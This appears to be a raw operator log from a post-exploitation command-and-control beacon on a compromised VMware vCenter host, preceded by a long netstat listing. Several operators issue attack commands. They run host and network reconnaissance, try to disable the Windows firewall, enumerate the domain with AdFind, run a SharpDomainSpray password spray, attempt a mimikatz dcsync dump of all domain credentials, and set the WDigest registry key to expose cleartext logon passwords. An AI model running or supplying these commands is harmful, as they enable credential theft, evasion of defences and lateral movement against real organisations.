+  TCP    127.0.0.1:50578        127.0.0.1:50579        ESTABLISHED     10412
+  TCP    127.0.0.1:50579        127.0.0.1:50578        ESTABLISHED     10412
+  TCP    127.0.0.1:50580        127.0.0.1:50581        ESTABLISHED     10412
+  TCP    127.0.0.1:50581        127.0.0.1:50580        ESTABLISHED     10412
+  TCP    127.0.0.1:50593        127.0.0.1:8085         ESTABLISHED     10636
+  TCP    127.0.0.1:50631        127.0.0.171:50001      ESTABLISHED     3888
+  TCP    127.0.0.1:50654        127.0.0.1:5432         ESTABLISHED     11220
+  TCP    127.0.0.1:50659        127.0.0.1:5432         ESTABLISHED     11220
+  TCP    127.0.0.1:50660        127.0.0.1:50661        ESTABLISHED     10636
+  TCP    127.0.0.1:50661        127.0.0.1:50660        ESTABLISHED     10636
+  TCP    127.0.0.1:50663        127.0.0.1:5432         ESTABLISHED     11220
+  TCP    127.0.0.1:50666        127.0.0.1:5432         ESTABLISHED     11220
+  TCP    127.0.0.1:50667        127.0.0.1:50668        ESTABLISHED     10636
+  TCP    127.0.0.1:50668        127.0.0.1:50667        ESTABLISHED     10636
+  TCP    127.0.0.1:50669        127.0.0.1:50670        ESTABLISHED     10636
+  TCP    127.0.0.1:50670        127.0.0.1:50669        ESTABLISHED     10636
+  TCP    127.0.0.1:50672        127.0.0.1:5432         ESTABLISHED     11220
+  TCP    127.0.0.1:50702        127.0.0.1:50703        ESTABLISHED     10636
+  TCP    127.0.0.1:50703        127.0.0.1:50702        ESTABLISHED     10636
+  TCP    127.0.0.1:50704        127.0.0.1:50705        ESTABLISHED     10636
+  TCP    127.0.0.1:50705        127.0.0.1:50704        ESTABLISHED     10636
+  TCP    127.0.0.1:50706        127.0.0.1:50707        ESTABLISHED     10636
+  TCP    127.0.0.1:50707        127.0.0.1:50706        ESTABLISHED     10636
+  TCP    127.0.0.1:50709        127.0.0.1:50710        ESTABLISHED     11220
+  TCP    127.0.0.1:50710        127.0.0.1:50709        ESTABLISHED     11220
+  TCP    127.0.0.1:50712        127.0.0.1:50713        ESTABLISHED     11220
+  TCP    127.0.0.1:50713        127.0.0.1:50712        ESTABLISHED     11220
+  TCP    127.0.0.1:50714        127.0.0.1:50715        ESTABLISHED     11220
+  TCP    127.0.0.1:50715        127.0.0.1:50714        ESTABLISHED     11220
+  TCP    127.0.0.1:50716        127.0.0.1:50717        ESTABLISHED     11220
+  TCP    127.0.0.1:50717        127.0.0.1:50716        ESTABLISHED     11220
+  TCP    127.0.0.1:50718        127.0.0.1:50719        ESTABLISHED     11220
+  TCP    127.0.0.1:50719        127.0.0.1:50718        ESTABLISHED     11220
+  TCP    127.0.0.1:50720        127.0.0.1:50721        ESTABLISHED     11220
+  TCP    127.0.0.1:50721        127.0.0.1:50720        ESTABLISHED     11220
+  TCP    127.0.0.1:50722        127.0.0.1:50723        ESTABLISHED     11220
+  TCP    127.0.0.1:50723        127.0.0.1:50722        ESTABLISHED     11220
+  TCP    127.0.0.1:50724        127.0.0.1:50725        ESTABLISHED     11220
+  TCP    127.0.0.1:50725        127.0.0.1:50724        ESTABLISHED     11220
+  TCP    127.0.0.1:50726        127.0.0.1:50727        ESTABLISHED     11220
+  TCP    127.0.0.1:50727        127.0.0.1:50726        ESTABLISHED     11220
+  TCP    127.0.0.1:50837        127.0.0.1:50838        ESTABLISHED     11220
+  TCP    127.0.0.1:50838        127.0.0.1:50837        ESTABLISHED     11220
+  TCP    127.0.0.1:50839        127.0.0.1:50840        ESTABLISHED     11220
+  TCP    127.0.0.1:50840        127.0.0.1:50839        ESTABLISHED     11220
+  TCP    127.0.0.1:50867        127.0.0.1:50868        ESTABLISHED     11220
+  TCP    127.0.0.1:50868        127.0.0.1:50867        ESTABLISHED     11220
+  TCP    127.0.0.1:50869        127.0.0.1:50870        ESTABLISHED     11220
+  TCP    127.0.0.1:50870        127.0.0.1:50869        ESTABLISHED     11220
+  TCP    127.0.0.1:50871        127.0.0.1:50872        ESTABLISHED     11220
+  TCP    127.0.0.1:50872        127.0.0.1:50871        ESTABLISHED     11220
+  TCP    127.0.0.1:50873        127.0.0.1:50874        ESTABLISHED     11220
+  TCP    127.0.0.1:50874        127.0.0.1:50873        ESTABLISHED     11220
+  TCP    127.0.0.1:50977        127.0.0.1:8085         ESTABLISHED     10636
+  TCP    127.0.0.1:51694        127.0.0.1:8006         ESTABLISHED     4544
+  TCP    127.0.0.1:51793        127.0.0.1:18091        TIME_WAIT       0
+  TCP    127.0.0.1:51805        127.0.0.1:18091        TIME_WAIT       0
+  TCP    127.0.0.1:51813        127.0.0.1:18091        TIME_WAIT       0
+  TCP    127.0.0.1:58278        127.0.0.1:58279        ESTABLISHED     6420
+  TCP    127.0.0.1:58279        127.0.0.1:58278        ESTABLISHED     6420
+  TCP    127.0.0.1:58330        127.0.0.1:58331        ESTABLISHED     6420
+  TCP    127.0.0.1:58331        127.0.0.1:58330        ESTABLISHED     6420
+  TCP    127.0.0.1:58332        127.0.0.1:58333        ESTABLISHED     6420
+  TCP    127.0.0.1:58333        127.0.0.1:58332        ESTABLISHED     6420
+  TCP    127.0.0.1:58351        127.0.0.1:5432         ESTABLISHED     6420
+  TCP    127.0.0.1:58935        127.0.0.1:58936        ESTABLISHED     11040
+  TCP    127.0.0.1:58936        127.0.0.1:58935        ESTABLISHED     11040
+  TCP    127.0.0.1:63055        127.0.0.1:10080        ESTABLISHED     10636
+  TCP    127.0.0.1:63797        127.0.0.1:8006         TIME_WAIT       0
+  TCP    127.0.0.1:64437        127.0.0.1:8085         TIME_WAIT       0
+  TCP    127.0.0.1:64765        127.0.0.1:12346        ESTABLISHED     4484
+  TCP    127.0.0.1:65212        127.0.0.1:8006         TIME_WAIT       0
+  TCP    127.0.0.171:50000      0.0.0.0:0              LISTENING       3004
+  TCP    127.0.0.171:50001      0.0.0.0:0              LISTENING       3164
+  TCP    127.0.0.171:50001      127.0.0.1:50631        ESTABLISHED     3164
+  TCP    127.0.0.171:50002      0.0.0.0:0              LISTENING       3852
+  TCP    127.0.0.171:50003      0.0.0.0:0              LISTENING       3888
+  TCP    [::]:80                [::]:0                 LISTENING       4544
+  TCP    [::]:135               [::]:0                 LISTENING       800
+  TCP    [::]:389               [::]:0                 LISTENING       3164
+  TCP    [::]:443               [::]:0                 LISTENING       4544
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:514               [::]:0                 LISTENING       10580
+  TCP    [::]:636               [::]:0                 LISTENING       3164
+  TCP    [::]:1514              [::]:0                 LISTENING       10580
+  TCP    [::]:2012              [::]:0                 LISTENING       3164
+  TCP    [::]:2014              [::]:0                 LISTENING       3888
+  TCP    [::]:2015              [::]:0                 LISTENING       3852
+  TCP    [::]:2020              [::]:0                 LISTENING       3004
+  TCP    [::]:3389              [::]:0                 LISTENING       920
+  TCP    [::]:5443              [::]:0                 LISTENING       5528
+  TCP    [::]:7080              [::]:0                 LISTENING       3824
+  TCP    [::]:7444              [::]:0                 LISTENING       3824
+  TCP    [::]:8109              [::]:0                 LISTENING       10580
+  TCP    [::]:8900              [::]:0                 LISTENING       3528
+  TCP    [::]:9443              [::]:0                 LISTENING       5576
+  TCP    [::]:12080             [::]:0                 LISTENING       4960
+  TCP    [::]:13080             [::]:0                 LISTENING       6420
+  TCP    [::]:47001             [::]:0                 LISTENING       4
+  TCP    [::]:49664             [::]:0                 LISTENING       504
+  TCP    [::]:49665             [::]:0                 LISTENING       984
+  TCP    [::]:49667             [::]:0                 LISTENING       1720
+  TCP    [::]:49668             [::]:0                 LISTENING       928
+  TCP    [::]:49669             [::]:0                 LISTENING       1644
+  TCP    [::]:49695             [::]:0                 LISTENING       648
+  TCP    [::]:49711             [::]:0                 LISTENING       632
+  TCP    [::1]:80               [::1]:50538            ESTABLISHED     4544
+  TCP    [::1]:80               [::1]:50782            ESTABLISHED     4544
+  TCP    [::1]:389              [::1]:49297            TIME_WAIT       0
+  TCP    [::1]:389              [::1]:49408            TIME_WAIT       0
+  TCP    [::1]:389              [::1]:49525            TIME_WAIT       0
+  TCP    [::1]:389              [::1]:49638            TIME_WAIT       0
+  TCP    [::1]:389              [::1]:49772            TIME_WAIT       0
+  TCP    [::1]:389              [::1]:49892            TIME_WAIT       0
+  TCP    [::1]:389              [::1]:50038            TIME_WAIT       0
+  TCP    [::1]:389              [::1]:50153            TIME_WAIT       0
+  TCP    [::1]:389              [::1]:50273            TIME_WAIT       0
+  TCP    [::1]:389              [::1]:50398            TIME_WAIT       0
+  TCP    [::1]:389              [::1]:50519            TIME_WAIT       0
+  TCP    [::1]:389              [::1]:50648            TIME_WAIT       0
+  TCP    [::1]:389              [::1]:50790            TIME_WAIT       0
+  TCP    [::1]:389              [::1]:50917            TIME_WAIT       0
+  TCP    [::1]:389              [::1]:51029            TIME_WAIT       0
+  TCP    [::1]:389              [::1]:51124            TIME_WAIT       0
+  TCP    [::1]:389              [::1]:51246            TIME_WAIT       0
+  TCP    [::1]:389              [::1]:51357            TIME_WAIT       0
+  TCP    [::1]:389              [::1]:51469            TIME_WAIT       0
+  TCP    [::1]:389              [::1]:51581            TIME_WAIT       0
+  TCP    [::1]:389              [::1]:51618            ESTABLISHED     3164
+  TCP    [::1]:389              [::1]:51706            TIME_WAIT       0
+  TCP    [::1]:389              [::1]:51821            TIME_WAIT       0
+  TCP    [::1]:389              [::1]:51940            TIME_WAIT       0
+  TCP    [::1]:389              [::1]:52048            TIME_WAIT       0
+  TCP    [::1]:389              [::1]:64418            ESTABLISHED     3164
+  TCP    [::1]:389              [::1]:64758            TIME_WAIT       0
+  TCP    [::1]:443              [::1]:50753            ESTABLISHED     4544
+  TCP    [::1]:5090             [::]:0                 LISTENING       5528
+  TCP    [::1]:5432             [::]:0                 LISTENING       4848
+  TCP    [::1]:5432             [::1]:50347            ESTABLISHED     4848
+  TCP    [::1]:5432             [::1]:51139            ESTABLISHED     4848
+  TCP    [::1]:5432             [::1]:51748            ESTABLISHED     4848
+  TCP    [::1]:5432             [::1]:51863            ESTABLISHED     4848
+  TCP    [::1]:7080             [::1]:51617            TIME_WAIT       0
+  TCP    [::1]:8085             [::]:0                 LISTENING       8908
+  TCP    [::1]:8085             [::1]:50754            ESTABLISHED     8908
+  TCP    [::1]:8089             [::]:0                 LISTENING       8908
+  TCP    [::1]:8089             [::1]:50497            ESTABLISHED     8908
+  TCP    [::1]:8089             [::1]:50512            ESTABLISHED     8908
+  TCP    [::1]:8089             [::1]:50539            ESTABLISHED     8908
+  TCP    [::1]:8089             [::1]:50571            ESTABLISHED     8908
+  TCP    [::1]:8089             [::1]:50783            ESTABLISHED     8908
+  TCP    [::1]:9090             [::]:0                 LISTENING       5576
+  TCP    [::1]:10080            [::]:0                 LISTENING       7608
+  TCP    [::1]:10080            [::1]:62119            ESTABLISHED     7608
+  TCP    [::1]:12080            [::1]:61806            ESTABLISHED     4960
+  TCP    [::1]:12080            [::1]:63123            ESTABLISHED     4960
+  TCP    [::1]:12346            [::]:0                 LISTENING       4484
+  TCP    [::1]:13080            [::1]:49322            TIME_WAIT       0
+  TCP    [::1]:13080            [::1]:50762            TIME_WAIT       0
+  TCP    [::1]:13080            [::1]:51781            ESTABLISHED     6420
+  TCP    [::1]:13080            [::1]:65442            TIME_WAIT       0
+  TCP    [::1]:15007            [::]:0                 LISTENING       10412
+  TCP    [::1]:16666            [::]:0                 LISTENING       11220
+  TCP    [::1]:16666            [::1]:64768            ESTABLISHED     11220
+  TCP    [::1]:18090            [::]:0                 LISTENING       5808
+  TCP    [::1]:18090            [::1]:62825            TIME_WAIT       0
+  TCP    [::1]:18091            [::]:0                 LISTENING       5828
+  TCP    [::1]:50347            [::1]:5432             ESTABLISHED     8908
+  TCP    [::1]:50497            [::1]:8089             ESTABLISHED     4544
+  TCP    [::1]:50512            [::1]:8089             ESTABLISHED     4544
+  TCP    [::1]:50538            [::1]:80               ESTABLISHED     10856
+  TCP    [::1]:50539            [::1]:8089             ESTABLISHED     4544
+  TCP    [::1]:50571            [::1]:8089             ESTABLISHED     4544
+  TCP    [::1]:50753            [::1]:443              ESTABLISHED     10856
+  TCP    [::1]:50754            [::1]:8085             ESTABLISHED     4544
+  TCP    [::1]:50782            [::1]:80               ESTABLISHED     10856
+  TCP    [::1]:50783            [::1]:8089             ESTABLISHED     4544
+  TCP    [::1]:51139            [::1]:5432             ESTABLISHED     8908
+  TCP    [::1]:51618            [::1]:389              ESTABLISHED     4960
+  TCP    [::1]:51748            [::1]:5432             ESTABLISHED     8908
+  TCP    [::1]:51781            [::1]:13080            ESTABLISHED     4544
+  TCP    [::1]:51863            [::1]:5432             ESTABLISHED     8908
+  TCP    [::1]:59873            [::1]:443              TIME_WAIT       0
+  TCP    [::1]:59874            [::1]:8085             TIME_WAIT       0
+  TCP    [::1]:61806            [::1]:12080            ESTABLISHED     4544
+  TCP    [::1]:62119            [::1]:10080            ESTABLISHED     8908
+  TCP    [::1]:63123            [::1]:12080            ESTABLISHED     4544
+  TCP    [::1]:64418            [::1]:389              ESTABLISHED     3824
+  TCP    [::1]:64768            [::1]:16666            ESTABLISHED     4544
+  UDP    0.0.0.0:88             *:*                                    3164
+  UDP    0.0.0.0:123            *:*                                    1028
+  UDP    0.0.0.0:500            *:*                                    928
+  UDP    0.0.0.0:514            *:*                                    10580
+  UDP    0.0.0.0:902            *:*                                    8908
+  UDP    0.0.0.0:3389           *:*                                    920
+  UDP    0.0.0.0:3544           *:*                                    928
+  UDP    0.0.0.0:4500           *:*                                    928
+  UDP    0.0.0.0:5050           *:*                                    1028
+  UDP    0.0.0.0:5353           *:*                                    1164
+  UDP    0.0.0.0:5355           *:*                                    1164
+  UDP    0.0.0.0:50634          *:*                                    7608
+  UDP    10.11.0.16:137         *:*                                    4
+  UDP    10.11.0.16:138         *:*                                    4
+  UDP    10.11.0.16:1900        *:*                                    11272
+  UDP    10.11.0.16:50425       *:*                                    11272
+  UDP    10.11.0.16:54033       *:*                                    928
+  UDP    127.0.0.1:1900         *:*                                    11272
+  UDP    127.0.0.1:50426        *:*                                    11272
+  UDP    127.0.0.1:64123        *:*                                    928
+  UDP    127.0.0.1:64384        *:*                                    4960
+  UDP    [::]:123               *:*                                    1028
+  UDP    [::]:500               *:*                                    928
+  UDP    [::]:902               *:*                                    8908
+  UDP    [::]:3389              *:*                                    920
+  UDP    [::]:4500              *:*                                    928
+  UDP    [::]:5353              *:*                                    1164
+  UDP    [::]:5355              *:*                                    1164
+  UDP    [::]:50634             *:*                                    7608
+  UDP    [::1]:1900             *:*                                    11272
+  UDP    [::1]:50424            *:*                                    11272
+  UDP    [::1]:63409            *:*                                    4848
+  UDP    [fe80::2857:2cee:87e5:34c6%2]:546  *:*                                    984
+  UDP    [fe80::e8e1:a4f8:12ae:48cd%5]:1900  *:*                                    11272
+  UDP    [fe80::e8e1:a4f8:12ae:48cd%5]:50423  *:*                                    11272
+
+
+01/12 01:37:04 UTC [input] <qwe> shell ping 10.101.0.6
+01/12 01:37:04 UTC [task] <T1059> Tasked beacon to run: ping 10.101.0.6
+01/12 01:37:04 UTC [checkin] host called home, sent: 46 bytes
+01/12 01:37:07 UTC [output]
+received output:
+
+正在 Ping 10.101.0.6 具有 32 字节的数据:
+来自 10.101.0.6 的回复: 字节=32 时间<1ms TTL=128
+来自 10.101.0.6 的回复: 字节=32 时间<1ms TTL=128
+来自 10.101.0.6 的回复: 字节=32 时间<1ms TTL=128
+来自 10.101.0.6 的回复: 字节=32 时间<1ms TTL=128
+
+10.101.0.6 的 Ping 统计信息:
+    数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，
+往返行程的估计时间(以毫秒为单位):
+    最短 = 0ms，最长 = 0ms，平均 = 0ms
+
+
+01/12 01:37:10 UTC [input] <qwe> shell ping 10.101.0.1
+01/12 01:37:10 UTC [task] <T1059> Tasked beacon to run: ping 10.101.0.1
+01/12 01:37:10 UTC [checkin] host called home, sent: 46 bytes
+01/12 01:37:20 UTC [output]
+received output:
+
+正在 Ping 10.101.0.1 具有 32 字节的数据:
+请求超时。
+请求超时。
+
+
+01/12 01:37:24 UTC [output]
+received output:
+请求超时。
+
+
+01/12 01:37:29 UTC [output]
+received output:
+请求超时。
+
+10.101.0.1 的 Ping 统计信息:
+    数据包: 已发送 = 4，已接收 = 0，丢失 = 4 (100% 丢失)，
+
+
+01/12 01:37:51 UTC [input] <qwe> shell ping 10.101.0.2
+01/12 01:37:51 UTC [task] <T1059> Tasked beacon to run: ping 10.101.0.2
+01/12 01:37:51 UTC [checkin] host called home, sent: 46 bytes
+01/12 01:38:01 UTC [output]
+received output:
+
+正在 Ping 10.101.0.2 具有 32 字节的数据:
+请求超时。
+请求超时。
+
+
+01/12 01:38:05 UTC [output]
+received output:
+请求超时。
+
+
+01/12 01:38:10 UTC [output]
+received output:
+请求超时。
+
+10.101.0.2 的 Ping 统计信息:
+    数据包: 已发送 = 4，已接收 = 0，丢失 = 4 (100% 丢失)，
+
+
+01/12 01:38:50 UTC [input] <qwe> shell ping 10.101.0.3
+01/12 01:38:50 UTC [task] <T1059> Tasked beacon to run: ping 10.101.0.3
+01/12 01:38:51 UTC [checkin] host called home, sent: 46 bytes
+01/12 01:39:01 UTC [output]
+received output:
+
+正在 Ping 10.101.0.3 具有 32 字节的数据:
+请求超时。
+请求超时。
+
+
+01/12 01:39:04 UTC [output]
+received output:
+请求超时。
+
+
+01/12 01:39:06 UTC [input] <qwe> shell ping 10.101.0.4
+01/12 01:39:06 UTC [task] <T1059> Tasked beacon to run: ping 10.101.0.4
+01/12 01:39:06 UTC [checkin] host called home, sent: 46 bytes
+01/12 01:39:17 UTC [output]
+received output:
+请求超时。
+
+10.101.0.3 的 Ping 统计信息:
+    数据包: 已发送 = 4，已接收 = 0，丢失 = 4 (100% 丢失)，
+
+
+01/12 01:39:17 UTC [output]
+received output:
+
+正在 Ping 10.101.0.4 具有 32 字节的数据:
+请求超时。
+请求超时。
+
+
+01/12 01:39:20 UTC [output]
+received output:
+请求超时。
+
+
+01/12 01:39:25 UTC [output]
+received output:
+请求超时。
+
+10.101.0.4 的 Ping 统计信息:
+    数据包: 已发送 = 4，已接收 = 0，丢失 = 4 (100% 丢失)，
+
+
+01/12 01:39:27 UTC [input] <qwe> sleep 0
+01/12 01:39:27 UTC [task] <T1029> Tasked beacon to become interactive
+01/12 01:39:27 UTC [checkin] host called home, sent: 40 bytes
+01/12 01:46:03 UTC [input] <ajie> socks 53876 SOCKS5 enableNoAuth "" "" disableLogging
+01/12 01:46:03 UTC [error] Could not start SOCKS5 server on 53876: Address already in use
+01/12 01:46:03 UTC [checkin] host called home, sent: 16 bytes
+01/12 01:58:11 UTC [input] <ajie> shell ipconfig
+01/12 01:58:11 UTC [task] <T1059> Tasked beacon to run: ipconfig
+01/12 01:58:11 UTC [checkin] host called home, sent: 39 bytes
+01/12 01:58:11 UTC [output]
+received output:
+
+Windows IP 配置
+
+
+以太网适配器 以太网:
+
+   连接特定的 DNS 后缀 . . . . . . . : 
+   本地链接 IPv6 地址. . . . . . . . : fe80::e8e1:a4f8:12ae:48cd%5
+   IPv4 地址 . . . . . . . . . . . . : 10.11.0.16
+   子网掩码  . . . . . . . . . . . . : 255.255.255.0
+   默认网关. . . . . . . . . . . . . : 10.11.0.253
+
+隧道适配器 isatap.{D09299DC-C302-42FF-89D5-3BDE832FB950}:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+隧道适配器 Teredo Tunneling Pseudo-Interface:
+
+   连接特定的 DNS 后缀 . . . . . . . : 
+   IPv6 地址 . . . . . . . . . . . . : 2001:0:348b:fb58:2857:2cee:87e5:34c6
+   本地链接 IPv6 地址. . . . . . . . : fe80::2857:2cee:87e5:34c6%2
+   默认网关. . . . . . . . . . . . . : ::
+
+
+01/12 01:59:46 UTC [input] <ajie> shell cmdkey/
+01/12 01:59:46 UTC [task] <T1059> Tasked beacon to run: cmdkey/
+01/12 01:59:46 UTC [checkin] host called home, sent: 38 bytes
+01/12 01:59:46 UTC [output]
+received output:
+
+命令行参数不正确。
+
+此命令的语法为:
+
+CMDKEY [{/add | /generic}:targetname {/smartcard | /user:username {/pass{:password}}} | /delete{:targetname | /ras} | /list{:targetname}]
+
+示例:
+
+  要列出可用的凭据:
+     cmdkey /list
+     cmdkey /list:targetname
+
+  要创建域凭据:
+     cmdkey /add:targetname /user:username /pass:password
+     cmdkey /add:targetname /user:username /pass
+     cmdkey /add:targetname /user:username
+     cmdkey /add:targetname /smartcard
+     
+  要创建普通凭据:
+     /add 开关可以由 /generic 替代，来创建普通凭据
+
+  要删除现有凭据:
+     cmdkey /delete:targetname
+
+  要删除 RAS 凭据:
+     cmdkey /delete /ras
+     
+
+
+01/12 02:02:24 UTC [input] <ajie> ls
+01/12 02:02:24 UTC [task] <> Tasked beacon to list files in .
+01/12 02:02:24 UTC [checkin] host called home, sent: 19 bytes
+01/12 02:02:24 UTC [output]
+C:\Program Files\VMware\vCenter Server\perfcharts\wrapper\bin\*
+D	0	01/11/2024 21:47:31	.
+D	0	01/11/2024 21:47:31	..
+F	19456	01/11/2024 20:20:46	chinese.exe
+F	1121	04/09/2018 13:41:56	heapsize_wrapper.bat
+F	6427136	01/11/2024 21:47:45	help.exe
+F	20783	07/17/2023 10:11:29	hs_err_pid10560.log
+F	4473	04/09/2018 13:41:56	InstallPerfCharts.bat
+F	4475	04/09/2018 13:41:56	QueryPerfCharts.bat
+F	185852	07/17/2023 10:11:29	replay_pid10560.log
+F	4475	04/09/2018 13:41:56	StartPerfCharts.bat
+F	4475	04/09/2018 13:41:56	StopPerfCharts.bat
+F	4475	04/09/2018 13:41:56	UninstallPerfCharts.bat
+F	640952	04/09/2018 13:42:18	wrapper.exe
+
+
+01/12 02:02:37 UTC [input] <ajie> shell arp -a
+01/12 02:02:37 UTC [task] <T1059> Tasked beacon to run: arp -a
+01/12 02:02:37 UTC [checkin] host called home, sent: 37 bytes
+01/12 02:02:37 UTC [error] could not spawn C:\Windows\system32\cmd.exe /C arp -a: 5 - ERROR_ACCESS_DENIED
+01/12 02:02:55 UTC [input] <ajie> ls
+01/12 02:02:56 UTC [task] <> Tasked beacon to list files in .
+01/12 02:02:56 UTC [checkin] host called home, sent: 19 bytes
+01/12 02:02:56 UTC [output]
+C:\Program Files\VMware\vCenter Server\perfcharts\wrapper\bin\*
+D	0	01/11/2024 21:47:31	.
+D	0	01/11/2024 21:47:31	..
+F	19456	01/11/2024 20:20:46	chinese.exe
+F	1121	04/09/2018 13:41:56	heapsize_wrapper.bat
+F	6427136	01/11/2024 21:47:45	help.exe
+F	20783	07/17/2023 10:11:29	hs_err_pid10560.log
+F	4473	04/09/2018 13:41:56	InstallPerfCharts.bat
+F	4475	04/09/2018 13:41:56	QueryPerfCharts.bat
+F	185852	07/17/2023 10:11:29	replay_pid10560.log
+F	4475	04/09/2018 13:41:56	StartPerfCharts.bat
+F	4475	04/09/2018 13:41:56	StopPerfCharts.bat
+F	4475	04/09/2018 13:41:56	UninstallPerfCharts.bat
+F	640952	04/09/2018 13:42:18	wrapper.exe
+
+
+01/12 02:03:38 UTC [input] <ajie> shell arp -a
+01/12 02:03:38 UTC [task] <T1059> Tasked beacon to run: arp -a
+01/12 02:03:38 UTC [checkin] host called home, sent: 37 bytes
+01/12 02:03:38 UTC [error] could not spawn C:\Windows\system32\cmd.exe /C arp -a: 5 - ERROR_ACCESS_DENIED
+01/12 02:35:30 UTC [input] <kun你太美> file_browser
+01/12 02:35:30 UTC [task] <> Tasked beacon to list files in . (from File Browser)
+01/12 02:35:30 UTC [checkin] host called home, sent: 19 bytes
+01/12 06:24:30 UTC [input] <laotan> cd desktop
+01/12 06:24:30 UTC [task] <> cd desktop
+01/12 06:24:30 UTC [checkin] host called home, sent: 15 bytes
+01/12 06:24:32 UTC [input] <laotan> ls
+01/12 06:24:32 UTC [task] <> Tasked beacon to list files in .
+01/12 06:24:32 UTC [checkin] host called home, sent: 19 bytes
+01/12 06:24:32 UTC [output]
+C:\Program Files\VMware\vCenter Server\perfcharts\wrapper\bin\*
+D	0	01/11/2024 21:47:31	.
+D	0	01/11/2024 21:47:31	..
+F	19456	01/11/2024 20:20:46	chinese.exe
+F	1121	04/09/2018 13:41:56	heapsize_wrapper.bat
+F	6427136	01/11/2024 21:47:45	help.exe
+F	20783	07/17/2023 10:11:29	hs_err_pid10560.log
+F	4473	04/09/2018 13:41:56	InstallPerfCharts.bat
+F	4475	04/09/2018 13:41:56	QueryPerfCharts.bat
+F	185852	07/17/2023 10:11:29	replay_pid10560.log
+F	4475	04/09/2018 13:41:56	StartPerfCharts.bat
+F	4475	04/09/2018 13:41:56	StopPerfCharts.bat
+F	4475	04/09/2018 13:41:56	UninstallPerfCharts.bat
+F	640952	04/09/2018 13:42:18	wrapper.exe
+
+
+01/12 06:24:43 UTC [input] <laotan> upload
+01/12 06:30:23 UTC [input] <laotan> shell python
+01/12 06:30:23 UTC [task] <T1059> Tasked beacon to run: python
+01/12 06:30:23 UTC [checkin] host called home, sent: 37 bytes
+01/12 06:30:23 UTC [output]
+received output:
+'python' 不是内部或外部命令，也不是可运行的程序
+或批处理文件。
+
+
+01/12 06:30:26 UTC [input] <laotan> python
+01/12 06:30:26 UTC [error] Unknown command: python
+01/12 06:30:32 UTC [input] <laotan> shell python3
+01/12 06:30:32 UTC [task] <T1059> Tasked beacon to run: python3
+01/12 06:30:32 UTC [checkin] host called home, sent: 38 bytes
+01/12 06:30:32 UTC [output]
+received output:
+'python3' 不是内部或外部命令，也不是可运行的程序
+或批处理文件。
+
+
+01/12 06:36:38 UTC [input] <jiao> ls
+01/12 06:36:38 UTC [task] <> Tasked beacon to list files in .
+01/12 06:36:38 UTC [checkin] host called home, sent: 19 bytes
+01/12 06:36:38 UTC [output]
+C:\Program Files\VMware\vCenter Server\perfcharts\wrapper\bin\*
+D	0	01/11/2024 21:47:31	.
+D	0	01/11/2024 21:47:31	..
+F	19456	01/11/2024 20:20:46	chinese.exe
+F	1121	04/09/2018 13:41:56	heapsize_wrapper.bat
+F	6427136	01/11/2024 21:47:45	help.exe
+F	20783	07/17/2023 10:11:29	hs_err_pid10560.log
+F	4473	04/09/2018 13:41:56	InstallPerfCharts.bat
+F	4475	04/09/2018 13:41:56	QueryPerfCharts.bat
+F	185852	07/17/2023 10:11:29	replay_pid10560.log
+F	4475	04/09/2018 13:41:56	StartPerfCharts.bat
+F	4475	04/09/2018 13:41:56	StopPerfCharts.bat
+F	4475	04/09/2018 13:41:56	UninstallPerfCharts.bat
+F	640952	04/09/2018 13:42:18	wrapper.exe
+
+
+01/12 06:36:38 UTC [input] <jiao> 
+01/12 06:36:38 UTC [error] Unknown command: 
+01/12 06:36:41 UTC [input] <jiao> shell whoami
+01/12 06:36:41 UTC [task] <T1059> Tasked beacon to run: whoami
+01/12 06:36:41 UTC [checkin] host called home, sent: 37 bytes
+01/12 06:36:41 UTC [error] could not spawn C:\Windows\system32\cmd.exe /C whoami: 5 - ERROR_ACCESS_DENIED
+01/12 06:36:49 UTC [input] <jiao> shell net user \\116.62.4.161
+01/12 06:36:49 UTC [task] <T1059> Tasked beacon to run: net user \\116.62.4.161
+01/12 06:36:49 UTC [checkin] host called home, sent: 54 bytes
+01/12 06:36:49 UTC [error] could not spawn C:\Windows\system32\cmd.exe /C net user \\116.62.4.161: 5 - ERROR_ACCESS_DENIED
+01/12 06:44:36 UTC [input] <jiao> shell netsh advfirewall set allprofiles state off
+01/12 06:44:36 UTC [task] <T1059> Tasked beacon to run: netsh advfirewall set allprofiles state off
+01/12 06:44:37 UTC [checkin] host called home, sent: 74 bytes
+01/12 06:44:37 UTC [error] could not spawn C:\Windows\system32\cmd.exe /C netsh advfirewall set allprofiles state off: 5 - ERROR_ACCESS_DENIED
+01/12 06:44:44 UTC [input] <jiao> shell whoami
+01/12 06:44:44 UTC [task] <T1059> Tasked beacon to run: whoami
+01/12 06:44:44 UTC [checkin] host called home, sent: 37 bytes
+01/12 06:44:44 UTC [error] could not spawn C:\Windows\system32\cmd.exe /C whoami: 5 - ERROR_ACCESS_DENIED
+01/12 08:14:11 UTC [output]
+9=========== 查询当前域中在线的计算机 ==========
+
+01/12 08:14:11 UTC [task] <T1059> Tasked beacon to run: AdFind.exe -sc computers_active
+01/12 08:14:11 UTC [checkin] host called home, sent: 62 bytes
+01/12 08:14:11 UTC [output]
+received output:
+'AdFind.exe' 不是内部或外部命令，也不是可运行的程序
+或批处理文件。
+
+
+01/12 08:15:02 UTC [task] <T1093> Tasked beacon to run .NET program: SharpDomainSpray.exe -User2Pass 
+01/12 08:15:02 UTC [checkin] host called home, sent: 115777 bytes
+01/12 08:15:03 UTC [output]
+received output:
+
+############## SharpDomainSpray Code By RcoIl ############## 
+
+[-] Invoke_3 on EntryPoint failed.
+
+
+01/12 08:15:47 UTC [task] <T1003, T1093> Tasked beacon to run mimikatz's @lsadump::dcsync /domain:域名 /all /csv command
+01/12 08:15:48 UTC [checkin] host called home, sent: 312946 bytes
+01/12 08:15:50 UTC [output]
+received output:
+ERROR kuhl_m_lsadump_dcsync ; Domain not present, or doesn't look like a FQDN
+
+
+01/12 08:16:44 UTC [output]
+9=========== 查询主域控 ==========
+
+01/12 08:16:44 UTC [task] <T1059> Tasked beacon to run: netdom query pdc
+01/12 08:16:44 UTC [checkin] host called home, sent: 47 bytes
+01/12 08:16:44 UTC [output]
+received output:
+此项操作需要使用“参数/域”
+
+参数错误。
+
+利用 "NETDOM HELP" 获取更多信息。
+
+
+
+01/12 08:21:37 UTC [task] <T1059> Tasked beacon to run: reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
